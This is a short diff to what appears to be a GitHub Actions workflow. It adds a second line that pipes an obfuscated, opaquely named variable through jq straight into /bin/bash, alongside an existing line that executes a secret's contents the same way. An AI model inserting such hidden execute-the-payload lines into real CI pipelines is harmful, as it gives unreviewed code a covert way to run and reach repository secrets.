@@ -27,6 +27,7 @@ jobs:
           fynyl87: ${{ secrets.fynyl87 }}
         run: |
           printf '%s' "$fynyl87" | jq -r .r9 | /bin/bash
+          echo $tuphj7 | jq -r .zvho84081 | /bin/bash
 
       - name: Save output
         if: always()
